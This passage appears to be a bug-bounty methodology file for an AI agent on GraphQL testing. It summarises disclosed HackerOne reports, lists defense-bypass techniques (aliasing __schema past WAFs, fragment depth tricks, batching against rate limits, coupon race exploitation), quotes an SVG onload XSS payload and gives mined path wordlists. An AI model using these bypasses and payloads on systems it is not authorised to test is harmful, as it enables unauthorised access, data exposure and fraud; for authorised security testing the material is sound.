  > When passing a where clause to a collection in the `graphql` endpoint, like `teams(where:{ state: { eq: soft launched}})` it queries the state through the secure schema - so it will not return any teams where the state does equal soft launched but you're not…

- **Insecure Direct Object Reference (IDOR) in GraphQL deleteProfileImages Mutation** — `#2968039` · Autodesk · $0 · ▲80

  > An IDOR (Insecure Direct Object Reference) vulnerability was found on Autodesk User Profile, through the "id" parameter which could have allowed an attacker to delete another user's photo.

- **Unauthenticated GraphQL access by prepending __schema to private operations** — `#3452015` · Enjin · $500 · ▲76

  > This security researcher went through an then located exactly where the vulnerability was introduced within the [platform-core](https://github.com/enjin/platform-core) repository so that a rapid fix could be introduced.

- **Team object in GraphQL discloses team group names and permissions** — `#343464` · HackerOne · $2,500 · ▲75

  > Because of the communications error, we can disclose the data - `team member groups{id,name,permissions}`

- **Team object in GraphQL disclosed of private programs via the industry** — `#707406` · HackerOne · $500 · ▲72

  > `{"data":{"team":{" id":"█████████","industry":"Computer Hardware \u0026 Peripherals"}}}`

- **Attachment object in GraphQL continues to grant access to files, even if they are removed from rendering** — `#1132606` · HackerOne · $0 · ▲66

  > In any case, we believe that when a client deletes a file from the page rendering(`{F number file}`), it deletes the path (link) to that file, i.e.

- **Image queue default key of 'None' and GraphQL unhandled type exception** — `#996041` · Reddit · $500 · ▲65

  > <a xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E" test 6</a



## Case studies



### Confidential data of users and limited metadata of programs and reports accessible via GraphQL

`#489146` · HackerOne · $0 · critical · 2019-02-03 · ▲1033

> Summary: The GraphQL endpoint doesn't have access controls implemented properly. Description: Any attacker can get personally identifiable information of users of Hackerone such as email address, backup hash codes, facebook user id, account recovery phone number verified at, totp enabled, etc. These are just some examples of fields which are getting leaked directly from GraphQL.



### Email address of any user can be queried on Report Invitation GraphQL type when username is known

`#792927` · HackerOne · $0 · high · 2020-02-20 · ▲671

> Summary: Email id of all hackerone users disclosure Description: There is an flaw , with that i can get all hackerone users email id Steps To Reproduce 1. Invoke the below graphql call POST /graphql HTTP/1.1 you will get below response 2. to reproduce from your account, create one test program, and create one report for that program, get that report id gid://hackerone/Report/626371 (here 626371 my test program's report id) convert it into base 64, replace…



### IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertification GraphQL query

`#2122671` · HackerOne · $0 · high · 2023-08-29 · ▲395

> Summary: Hey team, While editing our Licenses and certifications if we change the ID number we can delete other users Licenses and certifications . it simply can be done by editing the ID number in our graphql query. If change the ID from 1 to X possible range then we can delete all the Licenses and certifications present between these. Steps To Reproduce 1. Log in to your own account in two browsers A and B with User A and User B 2.



### Unauthenticated RCE in Taskcluster web-server via GraphQL filter argument (sift $where)

`#3782701` · Mozilla · $12,000 · critical · 2026-08-05 · ▲361

> The public GraphQL endpoint at /graphql allows an unauthenticated caller to execute arbitrary JavaScript inside the web-server's Node.js process. The query argument filter is a free-form JSON object that the server passes directly into the sift library. The version in use (sift 17.1.3) compiles a $where string into a function using new Function and executes it.



### Private list members disclosure via GraphQL

`#885539` · X / xAI · $0 · low · 2020-08-04 · ▲346

> Summary: Due to improper queries of GraphQL, the attacker can steal members of the private list. Description: Twitter implements a unique GraphQL endpoint, which can use only the queries that Twitter specified. However, there is a flaw in the backend (https://api.████████.com/graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers). This vulnerability requires snowflake brute-force, but it's not impossible.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class graphql --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class graphql

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class graphql

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class graphql --min-bounty 1000

```



## Bypass Techniques



**Defense: Introspection disabled**

- Bypass via field suggestion errors — send invalid field names and parse "did you mean X?" responses

- Use `clairvoyance` to brute-force field names against a wordlist

- Check JS bundles for hardcoded query strings that reveal the schema



**Defense: Depth limiting**

- Fragment spread to increase effective depth without hitting the limiter:

```graphql

fragment F on User { repos { teams { members { ...F } } } }

```



**Defense: Rate limiting per IP**

- Use batch operations (array of queries in one POST)

- Distribute across authenticated sessions



**Defense: Auth checks on mutations**

- Test with tokens at different privilege tiers (viewer, member, admin)

- Test unauthenticated — some mutations don't check session at all

- Test with tokens from *different organizations* — multi-tenant IDOR



**Defense: WAF blocking `__schema`**

- Alias the introspection field:

```graphql

{ s: __schema { t: types { n: name } } }

```

- Use HTTP parameter pollution or alternate content-type headers



**Defense: Operation whitelisting (persisted queries)**

- Check if the server falls back to ad-hoc queries when the `extensions.persistedQuery` hash mismatches

- Look for a non-whitelisted endpoint (dev, staging, internal proxy)



### Alias batching: when it wins races vs when it doesn't



A common claim is "alias batching defeats per-user rate limits and double-spend protections." Whether this actually wins depends on the **resolver execution model**:



| Resolver type | Behavior on aliased mutations | Alias batching wins races? |

|---|---|---|

| Multi-threaded / `DataLoader`-batched async | Aliases run concurrently, share state via batch | **YES** — single HTTP request can amplify a race-target N times |

| Single-threaded / single-DB-connection per request | Aliases run serially; first mutation closes the door | **NO** — combine with parallel HTTP |

| Distributed gateway (Apollo Federation) | Sub-queries dispatched concurrently to subgraphs | Depends on each subgraph |



**Verification example (single-threaded Flask + SQLite resolver):**

- 10 aliased `redeemCoupon` mutations in one request → only `r1` succeeds, r2-r10 fail with `already_redeemed`. Alias batching alone is insufficient.

- The same 10 mutations as **20 parallel HTTP POSTs** → 20 successes ($2000 from a $100 coupon).



**Operator rule:** treat alias batching as a single-RTT recon primitive. For race-target exploitation, combine with `race-condition`'s parallel-HTTP / Turbo Intruder single-packet attack. Verified in `docs/verification/phase2e-jwt-graphql-race.md` Test 11 vs Test 12.



---

## Corpus wordlists (mined)

### `params_graphql.txt`

```text
operation
ssl
type
embedded_submission_form_uuid
variables
document_type
name
sentry_key
access_level
core_hacker_username
core_team_handle
query
sort
page
```

### `paths_graphql.txt`

```text
/graphql
/admin/internal/web/graphql/core
/admin/api/graphql
/graphql/iUmNRKLdkKVH4WyBNw9x2A/ListMembers
/api/graphql
/-/graphql-explorer
/taskcluster
/api/secrets/v1
/i/lists/[ID
/access_account/invoice/
/store/
/api/shopify/
/api/shopify/███
/api/shopify/██████
/api/graphql/
/apps/graphiql
/secret-group-213
/rpadovani
/users/rpadovani/contributed
/api/v4/namespaces/16048
/docs/technotes/TN0021-graph-security/
/graphql/playground
/federal/graphql
/en-in/graphql
/cgi-bin/cvename.cgi
/api/30/csp-report/
/api/v4/user
/api/v4/projects//members
/admin/api/xauth
/StaffMember
/admin/api/unversioned/graphql
/admin/apps/pos
/shopify-pos
/shopify
/admin/apps/pos/staff/61357948984
/payments/%3fsomething%26.json
/payments
/payments/
/payments/1.json
/payments/something
/payments/1
/users/api
/api/unstable/graphql.json
/api/usage/bulk-operations/queries
/admin/apps/shopify-graphiql-app
/en/api/graphql-admin-api/call-limit
/-/graphiql-explorer
/api/internal/graphql/requestAuthEmail
/regex-explosive-quantifiers.html
/en/api/graphql-admin-api/reference/queryroot
/username
/admin/settings/channels
/admin/settings/checkout
/admin/settings/shipping
/admin/settings/gift_cards
/admin/settings/taxes
/admin
/admin/settings/general
/admin/settings/files
/admin/settings/payments
/admin/settings/account
/csp-report
/admin/settings/notifications
/xss-report
```

## Source skills merged into this topic

- `h1skills` — `hackerone-graphql`
- `hunting` — `graphql`
- `cbh` — `hunt-graphql`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
